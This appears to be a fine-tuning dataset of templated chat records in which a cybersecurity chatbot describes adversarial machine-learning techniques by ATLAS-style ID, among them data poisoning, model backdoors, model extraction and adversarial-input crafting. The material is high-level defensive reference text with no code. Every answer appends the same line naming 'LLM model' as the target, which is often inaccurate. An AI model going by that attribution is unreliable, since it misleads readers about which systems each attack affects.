{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Development Workspaces' and with the Id: AML.T0008.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Development Workspaces' and with the Id: AML.T0008.000 is described as follows: Developing and staging machine learning attacks often requires expensive compute resources.Adversaries may need access to one or many GPUs in order to develop an attack.They may try to anonymously use free resources such as Google Colaboratory, or cloud resources such as AWS, Azure, or Google Cloud as an efficient way to stand up temporary resources to conduct operations.Multiple workspaces may be used to avoid detection.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Consumer Hardware' and with the Id: AML.T0008.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Consumer Hardware' and with the Id: AML.T0008.001 is described as follows: Adversaries may acquire consumer hardware to conduct their attacks.Owning the hardware provides the adversary with complete control of the environment. These devices can be hard to trace.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Publish Poisoned Datasets' and with the Id: AML.T0019 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Publish Poisoned Datasets' and with the Id: AML.T0019 is described as follows: Adversaries may [Poison Training Data](/techniques/AML.T0020) and publish it to a public location.The poisoned dataset may be a novel dataset or a poisoned variant of an existing open source dataset.This data may be introduced to a victim system via [ML Supply Chain Compromise](/techniques/AML.T0010).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Supply Chain Compromise' and with the Id: AML.T0010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Supply Chain Compromise' and with the Id: AML.T0010 is described as follows: Adversaries may gain initial access to a system by compromising the unique portions of the ML supply chain.This could include [GPU Hardware](/techniques/AML.T0010.000), [Data](/techniques/AML.T0010.002) and its annotations, parts of the ML [ML Software](/techniques/AML.T0010.001) stack, or the [Model](/techniques/AML.T0010.003) itself.In some instances the attacker will need secondary access to fully carry out an attack using compromised components of the supply chain.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'GPU Hardware' and with the Id: AML.T0010.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'GPU Hardware' and with the Id: AML.T0010.000 is described as follows: Most machine learning systems require access to certain specialized hardware, typically GPUs.Adversaries can target machine learning systems by specifically targeting the GPU supply chain.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Software' and with the Id: AML.T0010.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Software' and with the Id: AML.T0010.001 is described as follows: Most machine learning systems rely on a limited set of machine learning frameworks.An adversary could get access to a large number of machine learning systems through a comprise of one of their supply chains.Many machine learning projects also rely on other open source implementations of various algorithms.These can also be compromised in a targeted way to get access to specific systems.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data' and with the Id: AML.T0010.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data' and with the Id: AML.T0010.002 is described as follows: Data is a key vector of supply chain compromise for adversaries.Every machine learning project will require some form of data.Many rely on large open source datasets that are publicly available.An adversary could rely on compromising these sources of data.The malicious data could be a result of [Poison Training Data](/techniques/AML.T0020) or include traditional malware.An adversary can also target private datasets in the labeling phase.The creation of private datasets will often require the hiring of outside labeling services.An adversary can poison a dataset by modifying the labels being generated by the labeling service.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Model' and with the Id: AML.T0010.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Model' and with the Id: AML.T0010.003 is described as follows: Machine learning systems often rely on open sourced models in various ways.Most commonly, the victim organization may be using these models for fine tuning.These models will be downloaded from an external source and then used as the base for the model as it is tuned on a smaller, private dataset.Loading models often requires executing some saved code in the form of a saved model file.These can be compromised with traditional malware, or through some adversarial machine learning techniques.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Model Inference API Access' and with the Id: AML.T0040 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Model Inference API Access' and with the Id: AML.T0040 is described as follows: Adversaries may gain access to a model via legitimate access to the inference API.Inference API access can be a source of information to the adversary ([Discover ML Model Ontology](/techniques/AML.T0013), [Discover ML Model Family](/techniques/AML.T0014)), a means of staging the attack ([Verify Attack](/techniques/AML.T0042), [Craft Adversarial Data](/techniques/AML.T0043)), or for introducing data to the target system for Impact ([Evade ML Model](/techniques/AML.T0015), [Erode ML Model Integrity](/techniques/AML.T0031)).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML-Enabled Product or Service' and with the Id: AML.T0047 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML-Enabled Product or Service' and with the Id: AML.T0047 is described as follows: Adversaries may use a product or service that uses machine learning under the hood to gain access to the underlying machine learning model.This type of indirect model access may reveal details of the ML model or its inferences in logs or metadata.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Physical Environment Access' and with the Id: AML.T0041 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Physical Environment Access' and with the Id: AML.T0041 is described as follows: In addition to the attacks that take place purely in the digital domain, adversaries may also exploit the physical environment for their attacks.If the model is interacting with data collected from the real world in some way, the adversary can influence the model through access to wherever the data is being collected.By modifying the data in the collection process, the adversary can perform modified versions of attacks designed for digital access.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Full ML Model Access' and with the Id: AML.T0044 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Full ML Model Access' and with the Id: AML.T0044 is described as follows: Adversaries may gain full \"white-box\" access to a machine learning model.This means the adversary has complete knowledge of the model architecture, its parameters, and class ontology.They may exfiltrate the model to [Craft Adversarial Data](/techniques/AML.T0043) and [Verify Attack](/techniques/AML.T0042) in an offline where it is hard to detect their behavior.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Discover ML Model Ontology' and with the Id: AML.T0013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Discover ML Model Ontology' and with the Id: AML.T0013 is described as follows: Adversaries may discover the ontology of a machine learning model's output space, for example, the types of objects a model can detect.The adversary may discovery the ontology by repeated queries to the model, forcing it to enumerate its output space.Or the ontology may be discovered in a configuration file or in documentation about the model.The model ontology helps the adversary understand how the model is being used by the victim.It is useful to the adversary in creating targeted attacks.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Discover ML Model Family' and with the Id: AML.T0014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Discover ML Model Family' and with the Id: AML.T0014 is described as follows: Adversaries may discover the general family of model.General information about the model may be revealed in documentation, or the adversary may use carefully constructed examples and analyze the model's responses to categorize it.Knowledge of the model family can help the adversary identify means of attacking the model and help tailor the attack.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Poison Training Data' and with the Id: AML.T0020 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Poison Training Data' and with the Id: AML.T0020 is described as follows: Adversaries may attempt to poison datasets used by a ML model by modifying the underlying data or its labels.This allows the adversary to embed vulnerabilities in ML models trained on the data that may not be easily detectable.Data poisoning attacks may or may not require modifying the labels.The embedded vulnerability is activated at a later time by data samples with an [Insert Backdoor Trigger](/techniques/AML.T0043.004)Poisoned data can be introduced via [ML Supply Chain Compromise](/techniques/AML.T0010) or the data may be poisoned after the adversary gains [Initial Access](/tactics/AML.TA0004) to the system.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Establish Accounts' and with the Id: AML.T0021 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Establish Accounts' and with the Id: AML.T0021 is described as follows: Adversaries may create accounts with various services for use in targeting, to gain access to resources needed in [ML Attack Staging](/tactics/AML.TA0001), or for victim impersonation.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Create Proxy ML Model' and with the Id: AML.T0005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Create Proxy ML Model' and with the Id: AML.T0005 is described as follows: Adversaries may obtain models to serve as proxies for the target model in use at the victim organization.Proxy models are used to simulate complete access to the target model in a fully offline manner.Adversaries may train models from representative datasets, attempt to replicate models from victim inference APIs, or use available pre-trained models.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Train Proxy via Gathered ML Artifacts' and with the Id: AML.T0005.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Train Proxy via Gathered ML Artifacts' and with the Id: AML.T0005.000 is described as follows: Proxy models may be trained from ML artifacts (such as data, model architectures, and pre-trained models) that are representative of the target model gathered by the adversary.This can be used to develop attacks that require higher levels of access than the adversary has available or as a means to validate pre-existing attacks without interacting with the target model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Train Proxy via Replication' and with the Id: AML.T0005.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Train Proxy via Replication' and with the Id: AML.T0005.001 is described as follows: Adversaries may replicate a private model.By repeatedly querying the victim's [ML Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.The inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.A replicated model that closely mimic's the target model is a valuable resource in staging the attack.The adversary can use the replicated model to [Craft Adversarial Data](/techniques/AML.T0043) for various purposes (e.g. [Evade ML Model](/techniques/AML.T0015), [Spamming ML System with Chaff Data](/techniques/AML.T0046)).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Use Pre-Trained Model' and with the Id: AML.T0005.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Use Pre-Trained Model' and with the Id: AML.T0005.002 is described as follows: Adversaries may use an off-the-shelf pre-trained model as a proxy for the victim model to aid in staging the attack.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Discover ML Artifacts' and with the Id: AML.T0007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Discover ML Artifacts' and with the Id: AML.T0007 is described as follows: Adversaries may search private sources to identify machine learning artifacts that exist on the system and gather information about them.These artifacts can include the software stack used to train and deploy models, training and testing data management systems, container registries, software repositories, and model zoos.This information can be used to identify targets for further collection, exfiltration, or disruption, and to tailor and improve attacks.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Execution' and with the Id: AML.T0011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Execution' and with the Id: AML.T0011 is described as follows: An adversary may rely upon specific actions by a user in order to gain execution.Users may inadvertently execute unsafe code introduced via [ML Supply Chain Compromise](/techniques/AML.T0010).Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unsafe ML Artifacts' and with the Id: AML.T0011.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unsafe ML Artifacts' and with the Id: AML.T0011.000 is described as follows: Adversaries may develop unsafe ML artifacts that when executed have a deleterious effect.The adversary can use this technique to establish persistent access to systems.These models may be introduced via a [ML Supply Chain Compromise](/techniques/AML.T0010).Serialization of models is a popular technique for model storage, transfer, and loading.However, this format without proper checking presents an opportunity for code execution.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Valid Accounts' and with the Id: AML.T0012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Valid Accounts' and with the Id: AML.T0012 is described as follows: Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.Credentials may take the form of usernames and passwords of individual user accounts or API keys that provide access to various ML resources and services.Compromised credentials may provide access to additional ML artifacts and allow the adversary to perform [Discover ML Artifacts](/techniques/AML.T0007).Compromised credentials may also grant an adversary increased privileges such as write access to ML artifacts used during development or production.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Evade ML Model' and with the Id: AML.T0015 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Evade ML Model' and with the Id: AML.T0015 is described as follows: Adversaries can [Craft Adversarial Data](/techniques/AML.T0043) that prevent a machine learning model from correctly identifying the contents of the data.This technique can be used to evade a downstream task where machine learning is utilized.The adversary may evade machine learning based virus/malware detection, or network scanning towards the goal of a traditional cyber attack.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Backdoor ML Model' and with the Id: AML.T0018 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Backdoor ML Model' and with the Id: AML.T0018 is described as follows: Adversaries may introduce a backdoor into a ML model.A backdoored model operates performs as expected under typical conditions, but will produce the adversary's desired output when a trigger is introduced to the input data.A backdoored model provides the adversary with a persistent artifact on the victim system.The embedded vulnerability is typically activated at a later time by data samples with an [Insert Backdoor Trigger](/techniques/AML.T0043.004). The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Poison ML Model' and with the Id: AML.T0018.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Poison ML Model' and with the Id: AML.T0018.000 is described as follows: Adversaries may introduce a backdoor by training the model poisoned data, or by interfering with its training process.The model learns to associate an adversary-defined trigger with the adversary's desired output.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Inject Payload' and with the Id: AML.T0018.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Inject Payload' and with the Id: AML.T0018.001 is described as follows: Adversaries may introduce a backdoor into a model by injecting a payload into the model file.The payload detects the presence of the trigger and bypasses the model, instead producing the adversary's desired output.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration via ML Inference API' and with the Id: AML.T0024 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration via ML Inference API' and with the Id: AML.T0024 is described as follows: Adversaries may exfiltrate private information via [ML Model Inference API Access](/techniques/AML.T0040).ML Models have been shown leak private information about their training data (e.g.  [Infer Training Data Membership](/techniques/AML.T0024.000), [Invert ML Model](/techniques/AML.T0024.001)).The model itself may also be extracted ([Extract ML Model](/techniques/AML.T0024.002)) for the purposes of [ML Intellectual Property Theft](/techniques/AML.T0048.004).Exfiltration of information relating to private training data raises privacy concerns.Private training data may include personally identifiable information, or other protected data.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Infer Training Data Membership' and with the Id: AML.T0024.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Infer Training Data Membership' and with the Id: AML.T0024.000 is described as follows: Adversaries may infer the membership of a data sample in its training set, which raises privacy concerns.Some strategies make use of a shadow model that could be obtained via [Train Proxy via Replication](/techniques/AML.T0005.001), others use statistics of model prediction scores.This can cause the victim model to leak private information, such as PII of those in the training set or other forms of protected IP.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Invert ML Model' and with the Id: AML.T0024.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Invert ML Model' and with the Id: AML.T0024.001 is described as follows: Machine learning models' training data could be reconstructed by exploiting the confidence scores that are available via an inference API.By querying the inference API strategically, adversaries can back out potentially private information embedded within the training data.This could lead to privacy violations if the attacker can reconstruct the data of sensitive features used in the algorithm.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Extract ML Model' and with the Id: AML.T0024.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Extract ML Model' and with the Id: AML.T0024.002 is described as follows: Adversaries may extract a functional copy of a private model.By repeatedly querying the victim's [ML Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.The inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.Adversaries may extract the model to avoid paying per query in a machine learning as a service setting.Model extraction is used for [ML Intellectual Property Theft](/techniques/AML.T0048.004).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration via Cyber Means' and with the Id: AML.T0025 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration via Cyber Means' and with the Id: AML.T0025 is described as follows: Adversaries may exfiltrate ML artifacts or other information relevant to their goals via traditional cyber means.See the ATT&CK [Exfiltration](https://attack.mitre.org/tactics/TA0010/) tactic for more information.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Denial of ML Service' and with the Id: AML.T0029 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Denial of ML Service' and with the Id: AML.T0029 is described as follows: Adversaries may target machine learning systems with a flood of requests for the purpose of degrading or shutting down the service.Since many machine learning systems require significant amounts of specialized compute, they are often expensive bottlenecks that can become overloaded.Adversaries can intentionally craft inputs that require heavy amounts of useless compute from the machine learning system.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spamming ML System with Chaff Data' and with the Id: AML.T0046 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spamming ML System with Chaff Data' and with the Id: AML.T0046 is described as follows: Adversaries may spam the machine learning system with chaff data that causes increase in the number of detections.This can cause analysts at the victim organization to waste time reviewing and correcting incorrect inferences.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Erode ML Model Integrity' and with the Id: AML.T0031 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Erode ML Model Integrity' and with the Id: AML.T0031 is described as follows: Adversaries may degrade the target model's performance with adversarial data inputs to erode confidence in the system over time.This can lead to the victim organization wasting time and money both attempting to fix the system and performing the tasks it was meant to automate by hand.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cost Harvesting' and with the Id: AML.T0034 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cost Harvesting' and with the Id: AML.T0034 is described as follows: Adversaries may target different machine learning services to send useless queries or computationally expensive inputs to increase the cost of running services at the victim organization.Sponge examples are a particular type of adversarial data designed to maximize energy consumption and thus operating cost.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Artifact Collection' and with the Id: AML.T0035 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Artifact Collection' and with the Id: AML.T0035 is described as follows: Adversaries may collect ML artifacts for [Exfiltration](/tactics/AML.TA0010) or for use in [ML Attack Staging](/tactics/AML.TA0001).ML artifacts include models and datasets as well as other telemetry data produced when interacting with a model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Information Repositories' and with the Id: AML.T0036 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Information Repositories' and with the Id: AML.T0036 is described as follows: Adversaries may leverage information repositories to mine valuable information.Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.Information stored in a repository may vary based on the specific instance or environment.Specific common information repositories include SharePoint, Confluence, and enterprise databases such as SQL Server.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data from Local System' and with the Id: AML.T0037 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data from Local System' and with the Id: AML.T0037 is described as follows: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.This can include basic fingerprinting information and sensitive data such as ssh keys.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Verify Attack' and with the Id: AML.T0042 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Verify Attack' and with the Id: AML.T0042 is described as follows: Adversaries can verify the efficacy of their attack via an inference API or access to an offline copy of the target model.This gives the adversary confidence that their approach works and allows them to carry out the attack at a later time of their choosing.The adversary may verify the attack once but use it against many edge devices running copies of the target model.The adversary may verify their attack digitally, then deploy it in the [Physical Environment Access](/techniques/AML.T0041) at a later time.Verifying the attack may be hard to detect since the adversary can use a minimal number of queries or an offline copy of the model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Craft Adversarial Data' and with the Id: AML.T0043 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Craft Adversarial Data' and with the Id: AML.T0043 is described as follows: Adversarial data are inputs to a machine learning model that have been modified such that they cause the adversary's desired effect in the target model.Effects can range from misclassification, to missed detections, to maximizing energy consumption.Typically, the modification is constrained in magnitude or location so that a human still perceives the data as if it were unmodified, but human perceptibility may not always be a concern depending on the adversary's intended effect.For example, an adversarial input for an image classification task is an image the machine learning model would misclassify, but a human would still recognize as containing the correct class.Depending on the adversary's knowledge of and access to the target model, the adversary may use different classes of algorithms to develop the adversarial example such as [White-Box Optimization](/techniques/AML.T0043.000), [Black-Box Optimization](/techniques/AML.T0043.001), [Black-Box Transfer](/techniques/AML.T0043.002), or [Manual Modification](/techniques/AML.T0043.003).The adversary may [Verify Attack](/techniques/AML.T0042) their approach works if they have white-box or inference API access to the model.This allows the adversary to gain confidence their attack is effective \"live\" environment where their attack may be noticed.They can then use the attack at a later time to accomplish their goals.An adversary may optimize adversarial examples for [Evade ML Model](/techniques/AML.T0015), or to [Erode ML Model Integrity](/techniques/AML.T0031).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'White-Box Optimization' and with the Id: AML.T0043.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'White-Box Optimization' and with the Id: AML.T0043.000 is described as follows: In White-Box Optimization, the adversary has full access to the target model and optimizes the adversarial example directly.Adversarial examples trained in this manner are most effective against the target model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Black-Box Optimization' and with the Id: AML.T0043.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Black-Box Optimization' and with the Id: AML.T0043.001 is described as follows: In Black-Box attacks, the adversary has black-box (i.e. [ML Model Inference API Access](/techniques/AML.T0040) via API access) access to the target model.With black-box attacks, the adversary may be using an API that the victim is monitoring.These attacks are generally less effective and require more inferences than [White-Box Optimization](/techniques/AML.T0043.000) attacks, but they require much less access.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Black-Box Transfer' and with the Id: AML.T0043.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Black-Box Transfer' and with the Id: AML.T0043.002 is described as follows: In Black-Box Transfer attacks, the adversary uses one or more proxy models (trained via [Create Proxy ML Model](/techniques/AML.T0005) or [Train Proxy via Replication](/techniques/AML.T0005.001)) they have full access to and are representative of the target model.The adversary uses [White-Box Optimization](/techniques/AML.T0043.000) on the proxy models to generate adversarial examples.If the set of proxy models are close enough to the target model, the adversarial example should generalize from one to another.This means that an attack that works for the proxy models will likely then work for the target model.If the adversary has [ML Model Inference API Access](/techniques/AML.T0040), they may use [Verify Attack](/techniques/AML.T0042) to confirm the attack is working and incorporate that information into their training process.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manual Modification' and with the Id: AML.T0043.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manual Modification' and with the Id: AML.T0043.003 is described as follows: Adversaries may manually modify the input data to craft adversarial data.They may use their knowledge of the target model to modify parts of the data they suspect helps the model in performing its task.The adversary may use trial and error until they are able to verify they have a working adversarial input.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Insert Backdoor Trigger' and with the Id: AML.T0043.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Insert Backdoor Trigger' and with the Id: AML.T0043.004 is described as follows: The adversary may add a perceptual trigger into inference data.The trigger may be imperceptible or non-obvious to humans.This technique is used in conjunction with [Poison ML Model](/techniques/AML.T0018.000) and allows the adversary to produce their desired effect in the target model.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'External Harms' and with the Id: AML.T0048 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'External Harms' and with the Id: AML.T0048 is described as follows: Adversaries may abuse their access to a victim system and use its resources or capabilities to further their goals by causing harms external to that system.These harms could affect the organization (e.g. Financial Harm, Reputational Harm), its users (e.g. User Harm), or the general public (e.g. Societal Harm).. The systems targeted by this attack pattern are: LLM model ."}]}
